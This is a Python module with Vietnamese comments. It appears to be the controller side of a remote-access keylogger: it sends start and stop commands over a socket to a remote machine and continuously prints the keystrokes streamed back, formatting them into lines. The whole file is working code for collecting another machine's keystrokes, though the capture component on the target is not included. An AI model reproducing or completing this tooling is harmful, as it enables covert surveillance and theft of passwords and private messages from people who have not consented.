from pynput import keyboard
import socket

# Biến trạng thái keylogger
keylogger_running = False
keys_pressed = ""
MAX_LINE_LENGTH = 50

def key_logger(client_socket):
    print("Connected to the server. Listening for keystrokes... (Press 'Esc' to stop)")
    keys_pressed = ""
    
    def on_press(key):
        # Dừng keylogger khi nhấn 'Esc'
        if key == keyboard.Key.esc:
            print("Stopping keylogger...")
            client_socket.sendall("STOP_KEY_LOGGER".encode())
            return False  # Dừng listener
        else:
            print(f'Key {key} pressed')  # Hiển thị phím nhấn cho debugging

    with keyboard.Listener(on_press=on_press) as listener:
        try:
            while True:
                # Nhận dữ liệu từ server
                data = client_socket.recv(1024)
                decoded_data = data.decode("utf-8")

                # Kiểm tra nếu nhận ký tự Enter từ server
                if decoded_data == ' Key.enter ':
                    print(f'\rKeys pressed: {keys_pressed}')  # In ra các phím đã nhấn
                    keys_pressed = ""  # Reset sau khi nhấn Enter
                    print("Keys pressed: ", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
                    
                elif decoded_data == "KEYLOGGER_STOPPED":
                    print("\nKeylogger has stopped.")
                    break  # Thoát khỏi vòng lặp để quay về menu chính
                
                else:
                    keys_pressed += decoded_data  # Thêm ký tự vào chuỗi
                    
                    # Nếu dòng quá dài, xuống dòng mà không lặp lại ký tự
                    if len(keys_pressed) > MAX_LINE_LENGTH:
                        print(f'\rKeys pressed: {keys_pressed[:MAX_LINE_LENGTH]}')  # In phần đầu của dòng
                        keys_pressed = keys_pressed[MAX_LINE_LENGTH:]  # Lưu phần còn lại để in tiếp
                    print(f'\rKeys pressed: {keys_pressed}', end='')  # In ra trên cùng một dòng

        except Exception as e:
            print(f"Error receiving data: {e}")
            
    listener.join()  # Wait for the listener to finish

def toggle_key_logger(client_socket):
    global keylogger_running
    if not keylogger_running:
        client_socket.sendall("START_KEY_LOGGER".encode())
        print("Starting keylogger...")
        keylogger_running = True
        key_logger(client_socket)
    else:
        client_socket.sendall("STOP_KEY_LOGGER".encode())
        # print("Stopping keylogger...")
        keylogger_running = False
